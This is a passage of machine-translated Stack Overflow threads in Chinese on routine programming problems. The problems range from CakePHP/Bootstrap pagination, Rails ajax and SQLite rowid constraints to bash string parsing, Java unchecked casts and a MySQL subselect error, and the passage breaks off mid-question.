    echo $this->Paginator->numbers(array('separator' => '', 'class' => 'btn btn-default', 'currentClass' => 'disabled', 'tag' => 'button'));
    echo $this->Paginator->next(__d('users', 'next') . ' >', array('class' => 'btn btn-default next', 'tag' => 'button'), null, array('class' => 'btn btn-default next disabled', 'tag' => 'button'));
    ?>
</div> 
```

**CSS：**

```
button:hover > a {
    text-decoration: none;
} 
```

* * *

**结果：**

![分页器](../Images/6793e15953456d2073c66deb738b52dd.png)

* * *

```
.paging {margin: 10px;}
button:hover > a {text-decoration: none;}
```

```
<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet"/>
<link href="http://getbootstrap.com/dist/css/bootstrap-theme.min.css" rel="stylesheet"/>

<div class="paging btn-group page-buttons">
	<button class="btn btn-default prev disabled">&lt; anterior</button>
	<button class="disabled btn btn-default">1</button>
	<button class="btn btn-default"><a href="/cakephp/users/index/page:2">2</a></button>
	<button class="btn btn-default next"><a href="/cakephp/users/index/page:2" rel="next">próximo &gt;</a></button>
</div>
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-04-19T16:18:58.020

您需要在活动页面的“li”标签之间添加一个锚标签，试试这个代码：

```
<nav>
    <ul class="pagination">
    <?php
    echo $this->Paginator->prev('&laquo;', array('tag' => 'li', 'escape' => false), '<a href="#">&laquo;</a>', array('class' => 'prev disabled', 'tag' => 'li', 'escape' => false));
    $numbers = $this->Paginator->numbers(array('separator' => '', 'tag' => 'li', 'currentLink' => true, 'currentClass' => 'active', 'currentTag' => 'a'));
    $numbers = preg_replace("#\<li class=\"active\"\>([0-9]+)\<\/li\>#", "<li class=\"active\"><a href=''>$1</a></li>",$numbers);
    echo $numbers;
    echo $this->Paginator->next('&raquo;', array('tag' => 'li', 'escape' => false), '<a href="#">&raquo;</a>', array('class' => 'prev disabled', 'tag' => 'li', 'escape' => false));
    ?>
    </ul>
</nav> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-08-08T19:36:23.983

如果你使用 Twitter Bootstrap 3.0 和 CakePHP 2.0 或 2.1，试试这个：

**css** *（在你的 css 中的某个地方，而不是在引导 css 中！）*

```
ul.pagination li.active {
    position: relative;
    float: left;
    padding: 6px 12px;
    margin-left: -1px;
    line-height: 1.428571429;
    text-decoration: none;
    background-color: #fff; 
    border: 1px solid #ddd;
} 
```

**CakePHP 视图** *（要显示分页栏的位置）*

```
<ul class="pagination">
    <?php
        echo ($this->Paginator->hasPrev()) ? $this->Paginator->prev('«', array('tag' => 'li'), null, null) : '<li class="disabled"><a href="#">«</a></li>';
        echo $this->Paginator->numbers(array('separator' => false, 'tag' => 'li'));   
        echo ($this->Paginator->hasNext()) ? $this->Paginator->next('»', array('tag' => 'li'), null, null) : '<li class="disabled"><a href="#">»</a></li>';
    ?>
</ul> 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-12-28T21:50:26.817

对于具有字体真棒和完整分页的引导程序 2，您可以使用它：

并为您的 css 或更少添加一些技巧

```
 <div class="pagination">
    <ul>
        <?php
        ## PAGINATION
        echo $this->Paginator->first('<i class="fa fa-angle-double-left"></i>', ['escape' => false, 'tag' => 'li']);
        //
        //
                echo $this->Paginator->prev('<span><i class="fa fa-angle-left"></i></span>', [
            'class' => 'prev enabled',
            'tag' => 'li',
            'escape' => false,
        ], null, [
            'class' => 'prev disabled',
            'tag' => 'li',
            'escape' => false,
        ]);
        echo $this->Paginator->numbers(
        [
            'separator' => '',
            'tag' => 'li',
            'modulus' => 20,
            'escape' => false,
            'currentTag' => 'span',
            'currentClass' => 'active',
        ]);
        //
        echo $this->Paginator->next('<span><i class="fa fa-angle-right"></i></span>', [
            'class' => 'next enabled',
            'tag' => 'li',
            'escape' => false,
        ], null, [
            'class' => 'next disabled',
            'tag' => 'li',
            'escape' => false,
        ]);
        echo $this->Paginator->last('<i class="fa fa-angle-double-right"></i>', ['escape' => false, 'tag' => 'li']);
        ?>

    </ul>
    <div class="pull-right paginationCounter">
        <?php
        echo $this->Paginator->counter(
        [
            'class' => 'pull-right',
            'format' => '{:page} / {:pages} pages, {:count} results',
        ]);
        ?>          
    </div>
</div> 
```

```
 /* Pagination bootstrap 2 add */
.pagination ul > li.active{
    float: left;
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #fff;
    border-color: #ddd;
    border-image: none;
    border-style: solid;
    border-width: 1px 1px 1px 0;
    line-height: 20px;
    padding: 4px 12px;
    text-decoration: none;
    cursor: default;
}

.pagination ul > li a[rel='first'], 
.pagination ul > li a[rel='last'], 
.pagination ul > li.prev a, 
.pagination ul > li.next a {
    height: 17px;
    padding-top: 7px;
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-02-24T09:05:07.850

```
<ul class="pagination">
<?php
  echo $this->Paginator->prev('&laquo;', array('tag' => 'li', 'escape' => false), '<a href="#">&laquo;</a>', array('class' => 'prev disabled', 'tag' => 'li', 'escape' => false));
  echo $this->Paginator->numbers(array('separator' => '', 'tag' => 'li', 'currentLink' => true, 'currentClass' => 'active', 'currentTag' => 'a'));
  echo $this->Paginator->next('&raquo;', array('tag' => 'li', 'escape' => false), '<a href="#">&raquo;</a>', array('class' => 'prev disabled', 'tag' => 'li', 'escape' => false));
?>
</ul> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-04-15T13:19:38.980

```
#pagination > li.current {
    z-index: 2;
    color: #ffffff;
    position: relative;
    float: left;
    padding: 6px 12px;
    line-height: 1.428571429;
    text-decoration: none;
    border: 1px solid #dddddd;
    margin-left: 0;
    color: #999999;
    z-index: 2;
    color: #ffffff;
    cursor: default;
    background-color: #428BCA;
    border-color: #428BCA;
}
#pagination > li.prev.disabled,#pagination > li.next.disabled {
    position: relative;
    float: left;
    padding: 6px 12px;
    line-height: 1.428571429;
    text-decoration: none;
    border: 1px solid #dddddd;
    margin-left: 0;
    color: #999999;
    cursor: not-allowed;
    background-color: #ffffff;
    border-color: #dddddd;
}
.pagination > li > a{
    color: #428BCA;
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-05-29T13:40:20.113

您无需添加任何 CSS 即可实现此目的：

```
<?php
echo $this->Paginator->numbers(array(
        'before' => '<ul class="pagination">',
        'separator' => '',
       'currentClass' => 'active',
        'currentTag' => 'a',
        'tag' => 'li',
        'after' => '</ul>'
    ));
?> 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2014-02-01T17:37:32.650

```
 if ($this->Paginator->hasPage(null, 2)) { 
    echo '<tfoot>';
    echo '<tr>';
    echo '<td colspan="7" class="text-right">';
    echo '  <ul class="pagination pagination-right">';
    echo $this->Paginator->first('<span class="glyphicon glyphicon-fast-backward"></span> First', array('escape' => false, 'tag' => 'li'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a'));
    echo $this->Paginator->prev('<span class="glyphicon glyphicon-step-backward"></span> Prev', array('escape' => false, 'tag' => 'li'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a'));
    echo $this->Paginator->numbers(array(
        'currentClass' => 'active',
        'currentTag' => 'a',
        'tag' => 'li',
        'separator' => '',
    ));
    echo $this->Paginator->next('Next <span class="glyphicon glyphicon-step-forward"></span>', array('escape' => false, 'tag' => 'li', 'currentClass' => 'disabled'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a'));
    echo $this->Paginator->last('Last <span class="glyphicon glyphicon-fast-forward"></span>', array('escape' => false, 'tag' => 'li', 'currentClass' => 'disabled'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a'));

    echo '  </ul>';
    echo '<p>'.$this->Paginator->counter(array('format' => 'Page {:page} of {:pages}, showing {:current} records out of {:count} total.')).'</p>';
    echo '</td>';
    echo '</tr>';
    echo '</tfoot>';    
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-06-06T15:53:51.397

这么多答案，但没有句柄省略号。您可以在下面找到完整版本，无需自定义 CSS。

CakePHP v2、Bootstrap v3

```
<ul class="pagination">
    <li><?php echo $this->Paginator->prev('Previous', array('escape' => false, 'tag' => 'li'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a')); ?></li>
    <li><?php echo $this->Paginator->numbers(array('separator' => '', 'currentTag' => 'a', 'currentClass' => 'active', 'tag' => 'li', 'first' => 1, 'ellipsis' => '<li class="disabled"><a>...</a></li>')); ?></li>
    <li><?php echo $this->Paginator->next('Next', array('escape' => false, 'tag' => 'li', 'currentClass' => 'disabled'), null, array('escape' => false, 'tag' => 'li', 'class' => 'disabled', 'disabledTag' => 'a')); ?></li>
</ul> 
```

结果代码：

```
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/>
<ul class="pagination">
	<li class="prev">
		<a href="/users/page:8" rel="prev">Previous</a>
	</li>
	<li>
		<a href="/users">1</a>
	</li>
	<li class="disabled">
		<a>...</a>
	</li>
	<li>
		<a href="/users/page:5">5</a>
	</li>
	<!-- more numbers here... -->
	<li class="active">
		<a>9</a>
	</li>
	<!-- more numbers here... -->
	<li class="next">
		<a href="/users/page:10" currentclass="disabled" rel="next">Next</a>
	</li>
</ul>
```

# javascript - 从文本框 jquery/javascript 数组中获取单个文本框值

> ID：14346185
> 
> 赞同：4
> 
> 时间：2013-01-15T20:22:41.513
> 
> 标签：javascript, jquery

我有一个这样的文本输入数组：

```
<input type="textbox" name="col[]">
<input type="textbox" name="col[]">
<input type="textbox" name="col[]"> 
```

它们是在运行时使用“添加”按钮生成的。

我可以使用获取文本框数组值

```
$('input[name="col[]"]').each(function(){
  alert($(this).val());
}); 
```

但是，如果我只需要第二个文本框值，那么我会直接获取它而不使用 jquery 循环遍历数组吗？

我感谢某人的帮助。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-15T20:23:29.323

用于`.eq()`选择它：

```
var $textboxes = $('input[name="col[]"]')

var value1 = $textboxes.eq(0).val();
var value2 = $textboxes.eq(1).val();
... 
```

# c++ - 更改子窗口大小 opengl

> ID：14346186
> 
> 赞同：0
> 
> 时间：2013-01-15T20:22:49.480
> 
> 标签：c++, opengl, window, glut, reshape

我正在使用 GLUT 使用 openGL。我想知道您是否可以通过用鼠标拖动它的“边框”来更改子窗口的窗口大小。（边界是我画的线）来标记子窗口的边界。我知道您可以设置初始宽度和高度，但这些是恒定的。

我知道有一个函数 glutReshapeFunc 但这只会在主窗口被重塑时为您提供窗口的新宽度和高度。

或者，GLUT 不允许您更改用户子窗口的大小吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:24:52.103

I'd not bother with GLUT subwindows. Instead I'd use glViewport + glScissor + glEnable(GL_SCISSOR_TEST), to cut portions from the main window viewport and draw a few splitter lines. Make the splitter lines draggable by implementing the logic with glutMouseFunc + glutMotionFunc.

# ruby-on-rails - 简单的ajax rails 3调用麻烦

> ID：14346189
> 
> 赞同：0
> 
> 时间：2013-01-15T20:23:01.373
> 
> 标签：ruby-on-rails, ajax, ruby-on-rails-3

所以我试图在 rails 3 中进行一个简单的 ajax 调用，但无法让 ajax 正确返回。我想我遗漏了一些明显的东西，但过去 3 个小时我一直在尝试，所以我想是时候问了。

我正在尝试在应该返回搜索结果的帖子模型的索引页面上进行 ajax 调用。

我的索引操作的 posts_controller.rb 看起来像这样。

```
 def index
    @posts = Post.search(params[:search])
    respond_to do |format|
      format.html # index.html.erb
      format.js #ajax call
      format.json { render json: @posts }
    end
  end 
```

我的 index.html.erb （其中包含搜索文本字段和要返回（ajax）结果的 div 看起来像这样

```
<%= form_tag posts_path, :method => "get", :remote => true do %>
 <%= text_field_tag :search, params[:search] %>
 <%= submit_tag "Search",  :class => "btn", :name => nil %>
<% end %>

<div id="posts">
    <%= render @posts %>
</div> 
```

我的 _post.html.erb 看起来像这样

```
<table>
    <tr>
        <td class="well well-small"><%= post.title %></td>
        <td class="well"><%= post.content %></td>
        <td><%= link_to 'Show', post %></td>
        <td><%= link_to 'Edit', edit_post_path(post) %></td>
        <td><%= link_to 'Destroy', post, method: :delete, data: { confirm: 'Are you sure?' } %></td>
    </tr>
    <br />
    <br />
</table> 
```

我的 index.js.erb 看起来像这样

```
$("#posts").html("<%= escape_javscript(render :partial => "new" ) %>"); 
```

我的 post.rb 模型页面看起来像这样

```
class Post < ActiveRecord::Base

  attr_accessible :content, :title
  def self.search (search)

    if search
      find(:all, :conditions => ['title LIKE ?', "%#{search}%"])
    else
      find(:all) 
    end
  end

end 
```

抱歉，必须有这么多代码只是想显示所有相关内容。出于某种原因，我的搜索结果没有用 ajax 更新。当我从 index.html.erb 的表单中删除 :remote => true 并删除 index.js.erb 文件时，搜索结果会很好地返回（没有 ajax），所以我的搜索功能不是问题。

在此先感谢您的帮助。一如既往，如果你给我一个好的答案，我会接受它作为正确的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:33:42.670

问题是您没有重新渲染新的帖子集合，而是渲染了“新”部分！

在你的 index.js.erb 文件上试试这个：

```
$("#posts").html("<%= j(render :collection => @posts ) %>"); 
```

不要更改您发布的任何其他内容，它应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:37:12.257

如果我理解你的问题，在你的 ajax 请求之后你想更新你的视图：所以我会在你的**posts_controller.rb**中尝试这样的事情：

```
format.js do 
    render :update do |page|
        page.replace_html 'id_of_your_refreshed_element', :partial => 'partial_content_refreshed'
    end
end 
```

它应该工作。您的 partial_view 将考虑您的新*@posts*变量。

我希望它会帮助你。

# android - 使用 rowid 整数主键时 SQLite 中的强制约束错误

> ID：14346190
> 
> 赞同：0
> 
> 时间：2013-01-15T20:23:01.627
> 
> 标签：android, sqlite, constraints

我使用以下命令创建了一个表：

```
CREATE TABLE Person (id INTEGER PRIMARY KEY NOT NULL, name TEXT NOT NULL) 
```

我遇到的问题是，`id`尽管有 NOT NULL 约束，我仍可以为该列插入 NULL。据我了解，这是因为该`id`列现在是`rowid`.

如果我将数据类型更改`id`为 INT 而不是 INTEGER，则约束按预期工作，但我失去了`rowid`别名（以及随之而来的好处）。

我的问题是：有没有办法在为作为别名的列传递 NULL 时引发约束错误`rowid`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:28:20.900

> 我遇到的问题是我可以为 id 列插入 NULL，尽管有 NOT NULL 约束。

如果您尝试`null`为`INTEGER PRIMARY KEY`SQLite 插入，将静默使用下一个适当的 id。

SQLite 方便地解释`INTEGER PRIMARY KEY`为`INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL`. 因此，为第一行插入一个`null`id 将创建一个 id 为 1 的行，依此类推。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T15:01:56.887

这里的简短回答似乎是没有办法在维护`rowid`别名的同时防止空插入。

# c# - 从 UpdatePanel / javascript 调用 C# getter - 从不获取更新的数据

> ID：14346193
> 
> 赞同：1
> 
> 时间：2013-01-15T20:23:22.273
> 
> 标签：c#, javascript, asp.net, updatepanel

我的代码隐藏中有这个属性。

```
public string LocationOptions
{
    get { return Session["LocationOptions"].ToString(); }
    set { Session["LocationOptions"] = value; }
} 
```

在前端，我有这个 javascript。

```
<script type="text/javascript">
    function pageLoad(sender, args) {           
        InitLocationsAutoComplete();
    }
</script>

<asp:UpdatePanel ID="upScript" runat="server">
     <ContentTemplate>
         <script type="text/javascript">
            function InitLocationsAutoComplete() {
                var locationsJson = '<%= LocationOptions %>';
                alert(locationsJson);
            }
        </script>
    </ContentTemplate>
</asp:UpdatePanel> 
```

我在 C# 代码中的 getter 和 setter 上设置断点。

我正在使用 MVP，并且 setter 被演示者调用。

在第一页加载时，事情按预期工作。设置器上的断点首先被击中。然后是getter上的断点。最后，我收到一个带有我期望看到的值的 javascript 警报。

我遇到了由其他更新面板触发的部分回发问题。在那些上，我的 setter 断点命中了一个新值。我的 getter 断点接下来会被击中，如果我快速观察，`Session["LocationOptions"]`我会在那里看到新值。但是当我收到 javascript 警报时，它仍然会从第一页加载时提醒初始值。

如果它仍然在 C# 中调用该属性，那么我不明白为什么更新的值没有通过 javascript。为什么我坚持使用第一页加载的初始值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:28:14.807

据我所知，部分更新内容中的 javascript 不会重新执行/重新评估。我的理解是，部分更新本质上将编辑 DOM 以更新页面的一部分，但这不允许动态更新页面上的 javascript。您可以`ScriptManager.RegisterClientScriptBlock`在服务器端使用在部分回发期间注册更新的 javascript。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:36:00.733

我过去也遇到过同样的问题。

问题是由于 dom 仅部分更新，我个人已通过在 ScriptManager 中注册脚本来纠正此问题。

示例如下： [ScriptManager.RegisterClientScriptBlock Method (Control, Type, String, String, Boolean)](http://msdn.microsoft.com/en-us/library/bb350750.aspx)

```
<%@ Page Language="C#" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
protected void Page_PreRender(object sender, EventArgs e)
{
    string script = @"
    function ToggleItem(id)
      {
        var elem = $get('div'+id);
        if (elem) 
        {
          if (elem.style.display != 'block') 
          {
            elem.style.display = 'block';
            elem.style.visibility = 'visible';
          } 
          else
          {
            elem.style.display = 'none';
            elem.style.visibility = 'hidden';
          }
        }
      }
    ";

    ScriptManager.RegisterClientScriptBlock(
        this,
        typeof(Page),
        "ToggleScript",
        script,
        true);
}

</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
<title>ScriptManager RegisterClientScriptInclude</title>
</head>
<body>
<form id="Form1" runat="server">
    <div>
        <br />
        <asp:ScriptManager ID="ScriptManager1" 
                             EnablePartialRendering="true"
                             runat="server">
        </asp:ScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" 
                           UpdateMode="Conditional"
                           runat="server">
            <ContentTemplate>
                <asp:XmlDataSource ID="XmlDataSource1"
                                   DataFile="~/App_Data/Contacts.xml"
                                   XPath="Contacts/Contact"
                                   runat="server"/>
                <asp:DataList ID="DataList1" DataSourceID="XmlDataSource1"
                    BackColor="White" BorderColor="#E7E7FF" BorderStyle="None"
                    BorderWidth="1px" CellPadding="3" GridLines="Horizontal"
                    runat="server">
                    <ItemTemplate>
                        <div style="font-size:larger; font-weight:bold; cursor:pointer;" 
                             onclick='ToggleItem(<%# Eval("ID") %>);'>
                            <span><%# Eval("Name") %></span>
                        </div>
                        <div id='div<%# Eval("ID") %>' 
                             style="display: block; visibility: visible;">
                            <span><%# Eval("Company") %></span>
                            <br />
                            <a href='<%# Eval("URL") %>' 
                               target="_blank" 
                               title='<%# Eval("Name", "Link to the {0} Web site") %>'>
                               <%# Eval("URL") %></a>
                            </asp:LinkButton>
                            <hr />
                        </div>
                    </ItemTemplate>
                    <FooterStyle BackColor="#B5C7DE" ForeColor="#4A3C8C" />
                    <SelectedItemStyle BackColor="#738A9C" Font-Bold="True" ForeColor="#F7F7F7" />
                    <AlternatingItemStyle BackColor="#F7F7F7" />
                    <ItemStyle BackColor="#E7E7FF" ForeColor="#4A3C8C" />
                    <HeaderStyle BackColor="#4A3C8C" Font-Bold="True" ForeColor="#F7F7F7" />
                </asp:DataList>
            </ContentTemplate>
        </asp:UpdatePanel>
    </div>
</form> 
```

我希望这有帮助。

# java - GWT 2.5 破坏了 RPC 方法 - 在 2.4 上很好，但在升级后无法正常工作

> ID：14346199
> 
> 赞同：0
> 
> 时间：2013-01-15T20:23:50.457
> 
> 标签：java, gwt, gwt-rpc, gwt-2.5

从 GWT 2.4.0 升级到 2.5.0 后，只有许多（许多！）RPC 方法中的一种被破坏，我不知道为什么。这是发生的事情（和没有发生的事情）：

1.  程序获取异步服务对象并调用其方法。
2.  由 GWT 代理对象生成的 Underyling 存在并被调用（不过我不知道它的内部结构）。
3.  浏览器不会向服务器发送任何请求（至少 Google Chrome 中内置的开发人员工具不会显示类似的情况。另一方面......请参阅 5.）。
4.  服务器上的实现永远不会被调用。
5.  但是，如果我停止服务器，`AsyncCallback.onFailure(Throwable)`则会立即执行。

为了清楚起见，我将重复一遍：**相同的代码在 GWT 2.4.0 上就像一个魅力，**而其他方法（如果不是全部的话，其中大多数）即使在 2.5.0 上也能正常工作。

现在一些代码。不确定是否有必要，但是...

**异步接口**

```
public interface BrokenServiceAsync {
    public void getData(int id, State state, AsyncCallback<Data> asyncCallback);
} 
```

**State 接口**（方法参数）和它的唯一实现都在外部模块中声明（添加为 jar 包）。我虽然这可能是那个问题的情况，但其他方法也在使用这些类。并且没有编译时错误。

**Data**包含一个 String 和一个 ArrayList 对象子类 com.extjs.gxt.ui.client.data.BaseModelData。大多数其他方法使用类似的对象并且它有效。

有任何想法吗？谢谢！

# javascript - 使用 cookie 为首次访问网站的访问者显示 Div

> ID：14346206
> 
> 赞同：2
> 
> 时间：2013-01-15T20:24:05.683
> 
> 标签：javascript, jquery, cookies

我正在尝试`#home-landing`在网站的主页上显示一个 div ( )，以便首次访问该网站。对于同一会话期间对主页的所有后续访问，我希望`#home-landing`将其设置为`display:none;`.

我在 stackoverflow 上找到了一些代码，用于在访问者前 5 次访问后隐藏 div，但它分布在不同的会话中。

```
if (!$.cookie('visits')) {
  $.cookie('visits', 1, {
    expires: 30
  });
}
$.cookie('visits', (parseInt($.cookie('visits')) + 1), {
  expires: 30
})
//will expire after 30 days
var overlayContact = function () {
  if (parseInt($.cookie('visits')) < 5) {
    $('#home-landing').show();
  }
};
setTimeout(overlayContact, 180000);
}); 
```

我将如何编写代码以实现这一点？

# bash - 为命令和命令选项解析 bash 变量

> ID：14346215
> 
> 赞同：2
> 
> 时间：2013-01-15T20:24:44.840
> 
> 标签：bash, shell, variables

输入变量包含：

```
key1-key2-key3_command 
```

输出需要：

```
command -k key1 -k key2 -k key3 
```

警告：键的数量可以从 1 到 3 不等。

I've counted the number of dashes and use that with an if statement to create a Boolean indicator for each key (ie. key1=1, unset key2). Then I was going to use something like `${parameter:+word}` to add in the key if the flag for that key is set. It started getting a bit messy so I thought I'd ask here on what the best way to achieve this would be.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:35:12.970

```
var='key1-key2-key3_command'

IFS=_ read -r  keys command <<< "$var"   # Split $var at underscores.
IFS=- read -ra keys         <<< "$keys"  # Split $keys at dashes, -a to save as array.

for key in "${keys[@]}"; do              # Treat $command as an array and add
    command+=(-k "$key")                 # -k arguments to it.
done

echo "${command[@]}" 
```

笔记：

*   这可以处理任意数量的键。
*   处理带有空格的键。
*   更改`$IFS`只是暂时的；它们不会影响后续命令。
*   如果要执行命令，请将最后一行更改为简单`"${command[@]}"`（无回显）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:28:51.790

```
echo "key1-key2-key3_command" | sed -r 's/(.*?)-(.*?)-(.*?)_(.*?)/\4 -k \1 -k \2 -k \3/g'
command -k key1 -k key2 -k key3 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T21:50:45.773

在子外壳中运行以避免污染当前的 IFS 和位置参数

```
( 
    IFS="-_"
    set -- $var
    command=("${!#}")
    while [[ "$1" != "${command[0]}" ]]; do 
        command+=(-k "$1")
        shift
    done
    echo "${command[@]}"
) 
```

删除“回声”执行。

# ms-access - Crystal Reports 11 - 添加了无用的空白页面，仅包含具有数据的组标题

> ID：14346216
> 
> 赞同：2
> 
> 时间：2013-01-15T20:24:45.293
> 
> 标签：ms-access, pdf, crystal-reports, crystal-reports-xi

我有一个在使用 Crystal Reports 之前从未见过的奇怪问题。

我为一家生成 200 多页的银行构建了一份复杂的 PDF 月度报告。规范花了几个月的时间与客户一起调整，但现在它工作得很好，显示了它应该显示的所有数据，所有数据都正确排序并带有正确的标题。

但由于某种原因，该报告在显示数据之前很少插入准空白页面，而且似乎是随机的。这些页面并非完全空白，我的所有标题（包括组标题）都会显示，但没有详细信息。正确的数据会在几页后显示，但无论我对 Section Expert 做什么，这些无用的页面都会在报告中不断弹出。要清楚标题和细节没有分开。标题在具有正确数据的页面中也可以很好地显示，它们只是复制到之前的额外空白页面。

这是一个示例：

![额外页面样本](../Images/914f49a83c029578625b3ad080e2d2c0.png)

除了最上层的数据之外，在我的任何部分中都没有选中“插入空白页”框，这可以正常工作，但是这些额外的页面不会插入到该级别的每个组的末尾。它们有时会随机插入到连贯部分的中间。

我还验证了“保持在一起”选项，并检查了包括详细信息在内的 4 个最低级别，因此我认为数据太大而无法与其标题放在同一页面上，但问题很少，随机且数据完美溢出当它出现时（如我的示例中的第 3 页）。并且检查所有这些框并没有改变任何东西。

没有抑制公式，唯一被抑制的部分是 GH1 和 GH2，但它们一直被无条件地抑制。如果没有数据，我尝试在标题中添加条件抑制公式，但问题是，有数据。标题似乎被无用地复制了。

该问题似乎与标头值的任何特定更改无关。在我的示例中，当报告点击某个投资组合的普通股时它会发生变化，但当另一个投资组合显示其普通股时不会发生。我检查了我的数据源中的数据，发生这种情况的数据行和没有发生这种情况的数据行之间的一切都是一致的。

我没有关于如何摆脱这些额外页面的想法。有人知道我的报告中发生了什么吗？

谢谢一堆。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T04:19:23.600

尝试为组切换“保持组在一起”，看看它是否有任何效果。您可以通过右键单击组找到选项，选择“更改组”（以显示组专家），然后在选项选项卡上。

此选项经常被忽略，因为“部分专家”中的“保持在一起”更加明显。

（您可能还想查看关闭“保持在一起”以了解这对您的报告有何影响）

# fallback - 根据 Rails 模型关闭 I18n/Globalize3 回退

> ID：14346218
> 
> 赞同：0
> 
> 时间：2013-01-15T20:24:54.277
> 
> 标签：fallback, globalize3, rails-i18n

是否可以根据 Rails 模型关闭 I18n/Globalize3 后备？即有些模型使用后备，有些没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-04T16:25:13.343

是的，可以通过覆盖`globalize_fallbacks`模型中的方法来实现。以带有翻译标题和内容的帖子模型为例：

```
class Post < ActiveRecord::Base

  translates :title, :content

  # Disable fallbacks for this model
  def globalize_fallbacks(locale)
    [locale]
  end

end 
```

您只需指定请求的语言环境只能回退到自身，无论您的全局配置中定义了什么。

# java - 来自 Observable 的通知后不安全的参数化 ArrayList 强制转换

> ID：14346219
> 
> 赞同：0
> 
> 时间：2013-01-15T20:25:07.663
> 
> 标签：java, generics, observer-pattern

我在 JAVA 中执行 obersver 模式的更新时遇到问题。我将来自队列系统的 ArrayList 发送到我的 Observer/s。现在的问题出在观察者中，我将 ArrayList 作为对象接收。下一步将转换为 ArrayList，但由于 Java 的运行时，我没有参数信息，这会导致不安全的转换。我的意思是我可以用一个完整的通用类通知我的观察者，但我不知道我是不是弄错了，或者它是“用巨石射击小鸟”。结果最终没有错误，因为我总是用一个类型通知这个观察者，但问题是我应该接受警告还是有解决方法。

```
 ArrayList<Message> messageList = sqsUtil.getMessagefromAnotherEntrypoint("myQueueName");
        if (messageList != null) {
            // notify Observers
            notifyObservers(messageList);

        } 
```

然后是发生不安全演员表的更新

```
 @Override
public void update(Observable o, Object arg) {
    ArrayList<Message> aMessageList = (ArrayList<Message>)arg;

} 
```

不过感谢帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:45:16.090

[JLS §5.1.9](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.9)讨论了未经检查的强制转换以及它们发生的时间/原因。长话短说：

*   你不检查这`arg`实际上是一个`ArrayList`（即`arg instanceof ArrayList<?>`）。
*   没有可能的方法来检查是否`arg`是`ArrayList`包含`Message`对象的（至少在不使用`instanceof`中的每个元素的情况下是这样`ArrayList`）。换句话说，`arg instanceof ArrayList<Message>`不编译。

如果您想摆脱警告（即您知道它不会抛出异常，或者您希望它抛出异常），那么您可以使用`@SuppressWarnings("unchecked")`：

```
@Override
public void update(Observable o, Object arg) {
    @SuppressWarnings("unchecked")
    ArrayList<Message> aMessageList = (ArrayList<Message>) arg;
} 
```

如果您只需要获取消息并且不希望出现异常：

```
@Override
public void update(Observable o, Object arg) {
    ArrayList<Message> messages = new ArrayList<Message>();
    if (arg instanceof ArrayList<?>)
        for (Object o : (ArrayList<?>) arg)
            if (o instanceof Message)
                messages.add((Message) o);

    // Do stuff with the messages list
} 
```

如果它是一个，这将只获取`Message`对象，否则它将是空的。`arg``ArrayList`

# mysql - sql在子选择中选择多行

> ID：14346220
> 
> 赞同：1
> 
> 时间：2013-01-15T20:25:08.310
> 
> 标签：mysql, subquery

首先，我知道目前这是不正确的。我知道这一点，因为它不起作用。话虽如此，任何有助于让我更接近我想要的结果的帮助都将受到赞赏。

我有一个查询：

```
$query = "SELECT cat.*, 
       prod.title                            AS product, 
       cat1.title                            AS category, 
       (SELECT cat2.* 
        FROM   ic_store_catalog AS cat2 
        WHERE  cat2.parentid = cat.parentid) AS children 
FROM   ic_store_catalog AS cat 
       LEFT JOIN ic_products AS prod 
              ON cat.productid = prod.productid 
       LEFT JOIN ic_product_categories AS cat1 
              ON cat.categoryid = cat1.categoryid 
WHERE  `storeid` = $storeid 
       AND `column` = $column 
       AND `parentid` = 0 
ORDER  BY `the_order` ASC"; 
```

这个错误给了我：`Operand should contain 1 column(s)`作为问题。这存在于子选择中保证。

`print_r`现在，当我使用in时，我需要实现`PHP`的`Array`结构与此类似：

```
[0] => Array
            (
                [catalogID] => 165
                [storeID] => 0
                [categoryID] => 7
                [parentID] => 0
                [productID] => 4
                [title] => 
                [column] => 1
                [the_order] => 1
                [cat_order] => 1
                [category] => Cookies & Brownies
                [children] => Array 
                (
                  [0] => Array (
